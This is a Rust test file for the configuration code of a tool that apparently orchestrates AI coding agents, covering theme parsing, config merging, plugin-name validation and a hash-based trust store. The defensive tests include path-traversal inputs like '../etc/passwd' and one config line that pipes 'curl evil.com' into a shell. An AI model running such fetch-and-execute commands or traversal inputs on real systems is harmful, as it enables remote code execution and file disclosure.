use agtx::config::{
    determine_first_run_action, FirstRunAction, GlobalConfig, MergedConfig, PhaseAgentsConfig,
    ProjectConfig, ThemeConfig, WorktreeConfig,
};

// === ThemeConfig Tests ===

#[test]
fn test_parse_hex_valid() {
    assert_eq!(ThemeConfig::parse_hex("#FFFFFF"), Some((255, 255, 255)));
    assert_eq!(ThemeConfig::parse_hex("#000000"), Some((0, 0, 0)));
    assert_eq!(ThemeConfig::parse_hex("#FF0000"), Some((255, 0, 0)));
    assert_eq!(ThemeConfig::parse_hex("#00FF00"), Some((0, 255, 0)));
    assert_eq!(ThemeConfig::parse_hex("#0000FF"), Some((0, 0, 255)));
    assert_eq!(ThemeConfig::parse_hex("#5cfff7"), Some((92, 255, 247)));
}

#[test]
fn test_parse_hex_without_hash() {
    assert_eq!(ThemeConfig::parse_hex("FFFFFF"), Some((255, 255, 255)));
    assert_eq!(ThemeConfig::parse_hex("000000"), Some((0, 0, 0)));
}

#[test]
fn test_parse_hex_invalid() {
    assert_eq!(ThemeConfig::parse_hex("#FFF"), None); // Too short
    assert_eq!(ThemeConfig::parse_hex("#FFFFFFF"), None); // Too long
    assert_eq!(ThemeConfig::parse_hex("#GGGGGG"), None); // Invalid hex chars
    assert_eq!(ThemeConfig::parse_hex(""), None); // Empty
}

#[test]
fn test_theme_config_default() {
    let theme = ThemeConfig::default();

    // Verify all default colors are valid hex
    assert!(ThemeConfig::parse_hex(&theme.color_selected).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_normal).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_dimmed).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_text).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_accent).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_description).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_column_header).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_popup_border).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_popup_header).is_some());
}

// === GlobalConfig Tests ===

#[test]
fn test_global_config_default() {
    let config = GlobalConfig::default();

    assert_eq!(config.default_agent, "claude");
    assert!(config.worktree.enabled);
    assert!(config.worktree.auto_cleanup);
    assert_eq!(config.worktree.base_branch, "");
}

// === WorktreeConfig Tests ===

#[test]
fn test_worktree_config_default() {
    let config = WorktreeConfig::default();

    assert!(config.enabled);
    assert!(config.auto_cleanup);
    assert_eq!(config.base_branch, "");
}

// === ProjectConfig Tests ===

#[test]
fn test_project_config_default() {
    let config = ProjectConfig::default();

    assert!(config.default_agent.is_none());
    assert!(config.base_branch.is_none());
    assert!(config.github_url.is_none());
    assert!(config.copy_files.is_none());
    assert!(config.init_script.is_none());
    assert!(config.cleanup_script.is_none());
}

// === MergedConfig Tests ===

#[test]
fn test_merged_config_uses_global_defaults() {
    let global = GlobalConfig::default();
    let project = ProjectConfig::default();

    let merged = MergedConfig::merge(&global, &project);

    assert_eq!(merged.default_agent, "claude");
    assert_eq!(merged.base_branch, "");
    assert!(merged.worktree_enabled);
    assert!(merged.auto_cleanup);
    assert!(merged.copy_files.is_none());
    assert!(merged.init_script.is_none());
    assert!(merged.cleanup_script.is_none());
}

#[test]
fn test_merged_config_project_overrides() {
    let global = GlobalConfig::default();
    let project = ProjectConfig {
        default_agent: Some("codex".to_string()),
        agents: None,
        base_branch: Some("develop".to_string()),
        worktree_dir: None,
        github_url: Some("https://github.com/user/repo".to_string()),
        copy_files: Some(".env, .env.local".to_string()),
        init_script: Some("npm install".to_string()),
        cleanup_script: Some("scripts/cleanup.sh".to_string()),
        workflow_plugin: None,
    };

    let merged = MergedConfig::merge(&global, &project);

    assert_eq!(merged.default_agent, "codex");
    assert_eq!(merged.base_branch, "develop");
    assert_eq!(
        merged.github_url,
        Some("https://github.com/user/repo".to_string())
    );
    assert_eq!(merged.copy_files, Some(".env, .env.local".to_string()));
    assert_eq!(merged.init_script, Some("npm install".to_string()));
    // worktree_dir not overridden, uses global default
    assert_eq!(merged.worktree_dir, ".agtx/worktrees");
    assert_eq!(
        merged.cleanup_script,
        Some("scripts/cleanup.sh".to_string())
    );
}

#[test]
fn test_merged_config_worktree_dir_override() {
    let global = GlobalConfig::default();
    let project = ProjectConfig {
        worktree_dir: Some(".worktrees".to_string()),
        ..Default::default()
    };

    let merged = MergedConfig::merge(&global, &project);
    assert_eq!(merged.worktree_dir, ".worktrees");
}

#[test]
fn test_merged_config_worktree_dir_global() {
    let mut global = GlobalConfig::default();
    global.worktree.worktree_dir = ".wt".to_string();
    let project = ProjectConfig::default();

    let merged = MergedConfig::merge(&global, &project);
    assert_eq!(merged.worktree_dir, ".wt");
}

// === FirstRunAction Tests ===

#[test]
fn test_first_run_config_exists() {
    assert_eq!(
        determine_first_run_action(true, false, false),
        FirstRunAction::ConfigExists,
    );
}

#[test]
fn test_first_run_config_exists_ignores_other_flags() {
    // Config exists takes priority over everything
    assert_eq!(
        determine_first_run_action(true, true, true),
        FirstRunAction::ConfigExists,
    );
}

#[test]
fn test_first_run_migrated() {
    assert_eq!(
        determine_first_run_action(false, true, false),
        FirstRunAction::Migrated,
    );
}

#[test]
fn test_first_run_migrated_with_db() {
    // Migration takes priority over DB existence
    assert_eq!(
        determine_first_run_action(false, true, true),
        FirstRunAction::Migrated,
    );
}

#[test]
fn test_first_run_existing_user_save_defaults() {
    assert_eq!(
        determine_first_run_action(false, false, true),
        FirstRunAction::ExistingUserSaveDefaults,
    );
}

#[test]
fn test_first_run_new_user_prompt() {
    assert_eq!(
        determine_first_run_action(false, false, false),
        FirstRunAction::NewUserPrompt,
    );
}

// === PhaseAgentsConfig Tests ===

#[test]
fn test_agent_for_phase_all_defaults() {
    let config = MergedConfig::merge(&GlobalConfig::default(), &ProjectConfig::default());
    assert_eq!(config.agent_for_phase("research"), "claude");
    assert_eq!(config.agent_for_phase("planning"), "claude");
    assert_eq!(config.agent_for_phase("running"), "claude");
    assert_eq!(config.agent_for_phase("review"), "claude");
    assert_eq!(config.agent_for_phase("unknown"), "claude");
}

#[test]
fn test_agent_for_phase_global_overrides() {
    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());
    global.agents.review = Some("gemini".to_string());

    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    assert_eq!(config.agent_for_phase("research"), "claude");
    assert_eq!(config.agent_for_phase("planning"), "claude");
    assert_eq!(config.agent_for_phase("running"), "codex");
    assert_eq!(config.agent_for_phase("review"), "gemini");
}

#[test]
fn test_agent_for_phase_project_overrides_global() {
    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());

    let project = ProjectConfig {
        agents: Some(PhaseAgentsConfig {
            running: Some("gemini".to_string()),
            ..Default::default()
        }),
        ..Default::default()
    };

    let config = MergedConfig::merge(&global, &project);
    // Project override wins
    assert_eq!(config.agent_for_phase("running"), "gemini");
    // Unset phases fall back to default_agent
    assert_eq!(config.agent_for_phase("planning"), "claude");
}

#[test]
fn test_agent_for_phase_project_default_agent() {
    let project = ProjectConfig {
        default_agent: Some("codex".to_string()),
        ..Default::default()
    };

    let config = MergedConfig::merge(&GlobalConfig::default(), &project);
    // All phases fall back to project's default_agent
    assert_eq!(config.agent_for_phase("research"), "codex");
    assert_eq!(config.agent_for_phase("running"), "codex");
}

#[test]
fn test_agent_for_phase_planning_with_research() {
    let mut global = GlobalConfig::default();
    global.agents.planning = Some("gemini".to_string());

    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    // "planning_with_research" maps to the planning agent
    assert_eq!(config.agent_for_phase("planning_with_research"), "gemini");
}

#[test]
fn test_explicit_agent_for_phase_returns_none_when_unset() {
    let config = MergedConfig::merge(&GlobalConfig::default(), &ProjectConfig::default());
    // No [agents] section — all phases return None
    assert_eq!(config.explicit_agent_for_phase("research"), None);
    assert_eq!(config.explicit_agent_for_phase("planning"), None);
    assert_eq!(config.explicit_agent_for_phase("running"), None);
    assert_eq!(config.explicit_agent_for_phase("review"), None);
}

#[test]
fn test_explicit_agent_for_phase_returns_some_when_set() {
    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());

    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    assert_eq!(config.explicit_agent_for_phase("running"), Some("codex"));
    assert_eq!(config.explicit_agent_for_phase("review"), None);
}

#[test]
fn test_phase_agents_config_serde_roundtrip() {
    let toml_str = r#"
default_agent = "claude"

[agents]
running = "codex"
review = "gemini"
"#;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert_eq!(config.agents.running, Some("codex".to_string()));
    assert_eq!(config.agents.review, Some("gemini".to_string()));
    assert_eq!(config.agents.research, None);
    assert_eq!(config.agents.planning, None);
}

#[test]
fn test_phase_agents_config_backwards_compatible() {
    // Config without [agents] section should parse fine
    let toml_str = r#"
default_agent = "claude"
"#;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert_eq!(config.agents.research, None);
    assert_eq!(config.agents.planning, None);
    assert_eq!(config.agents.running, None);
    assert_eq!(config.agents.review, None);
}

#[test]
fn test_fullscreen_on_enter_defaults_to_false() {
    let config: GlobalConfig = toml::from_str("").unwrap();
    assert!(!config.fullscreen_on_enter);
}

#[test]
fn test_fullscreen_on_enter_set_true() {
    let toml_str = r#"
fullscreen_on_enter = true
"#;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert!(config.fullscreen_on_enter);
}

#[test]
fn test_fullscreen_on_enter_merged() {
    let mut global = GlobalConfig::default();
    global.fullscreen_on_enter = true;
    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    assert!(config.fullscreen_on_enter);
}

#[test]
fn test_fullscreen_on_enter_from_real_config() {
    let toml_str = r##"
default_agent = "claude"
fullscreen_on_enter = true

[worktree]
enabled = true

[theme]
color_selected = "#ead49a"
"##;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert!(config.fullscreen_on_enter);
    assert_eq!(config.default_agent, "claude");
}

#[test]
fn test_fullscreen_on_enter_exact_user_config() {
    let toml_str = r##"
default_agent = "claude"
fullscreen_on_enter = true

[agents]

[worktree]
enabled = true
auto_cleanup = true
base_branch = ""
worktree_dir = ".worktrees"

[theme]
color_selected = "#ead49a"
color_normal = "#5cfff7"
color_dimmed = "#9C9991"
color_text = "#f2ece6"
color_accent = "#5cfff7"
color_description = "#C4B0AC"
color_column_header = "#a0d2fa"
color_popup_border = "#9ffcf8"
color_popup_header = "#69fae7"
"##;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert!(config.fullscreen_on_enter, "fullscreen_on_enter should be true");
    let merged = MergedConfig::merge(&config, &ProjectConfig::default());
    assert!(merged.fullscreen_on_enter, "merged fullscreen_on_enter should be true");
}

// === Plugin Name Validation Tests (Fix 1) ===

use agtx::config::WorkflowPlugin;

#[test]
fn test_plugin_name_rejects_path_traversal() {
    assert!(WorkflowPlugin::validate_plugin_name("../etc").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo/bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo\\bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("..").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("").is_err());
}

#[test]
fn test_plugin_name_rejects_dot_prefix() {
    assert!(WorkflowPlugin::validate_plugin_name(".hidden").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("..sneaky").is_err());
}

#[test]
fn test_plugin_name_rejects_special_characters() {
    assert!(WorkflowPlugin::validate_plugin_name("foo bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo@bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo$bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("../../etc/passwd").is_err());
}

#[test]
fn test_plugin_name_accepts_valid_names() {
    assert!(WorkflowPlugin::validate_plugin_name("agtx").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("spec-kit").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("my_plugin_2").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("GSD").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("a").is_ok());
}

#[test]
fn test_plugin_dir_returns_none_for_invalid_name() {
    // Path traversal names should return None, not panic
    assert!(WorkflowPlugin::plugin_dir("../evil", None).is_none());
    assert!(WorkflowPlugin::plugin_dir("", None).is_none());
    assert!(WorkflowPlugin::plugin_dir("foo/bar", None).is_none());
}

#[test]
fn test_plugin_load_rejects_invalid_name() {
    let result = WorkflowPlugin::load("../etc/passwd", None);
    assert!(result.is_err());
    let err_msg = result.unwrap_err().to_string();
    assert!(err_msg.contains("invalid characters"));
}

// === TrustStore Tests (Fix 9) ===

use agtx::config::TrustStore;
use tempfile::TempDir;

#[test]
fn test_trust_store_default_is_empty() {
    let store = TrustStore::default();
    assert!(store.projects.is_empty());
}

#[test]
fn test_trust_store_is_trusted_no_config_file() {
    // A project with no .agtx/config.toml should be trusted (nothing to distrust)
    let temp_dir = TempDir::new().unwrap();
    let store = TrustStore::default();
    assert!(store.is_trusted(temp_dir.path()));
}

#[test]
fn test_trust_store_untrusted_when_config_exists_but_not_stored() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();

    let store = TrustStore::default();
    // Config exists but no stored hash — untrusted
    assert!(!store.is_trusted(temp_dir.path()));
}

#[test]
fn test_trust_store_hash_config_returns_some_when_config_exists() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();

    let hash = TrustStore::hash_config(temp_dir.path());
    assert!(hash.is_some());
    // SHA-256 hex digest is 64 chars
    assert_eq!(hash.unwrap().len(), 64);
}

#[test]
fn test_trust_store_hash_config_returns_none_when_no_config() {
    let temp_dir = TempDir::new().unwrap();
    let hash = TrustStore::hash_config(temp_dir.path());
    assert!(hash.is_none());
}

#[test]
fn test_trust_store_hash_config_is_deterministic() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::write(config_dir.join("config.toml"), "init_script = \"npm install\"").unwrap();

    let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
    let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
    assert_eq!(hash1, hash2);
}

#[test]
fn test_trust_store_hash_changes_when_config_changes() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();

    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo v1\"").unwrap();
    let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();

    std::fs::write(config_dir.join("config.toml"), "init_script = \"curl evil.com | sh\"").unwrap();
    let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();

    assert_ne!(hash1, hash2);
}


// === FeatureFlags Tests (Fix 4) ===

use agtx::FeatureFlags;

#[test]
fn test_feature_flags_default() {
    let flags = FeatureFlags::default();
    assert!(!flags.experimental);
    assert!(!flags.no_init_scripts);
}

#[test]
fn test_feature_flags_no_init_scripts() {
    let flags = FeatureFlags {
        experimental: false,
        no_init_scripts: true,
    };
    assert!(flags.no_init_scripts);
    assert!(!flags.experimental);
}
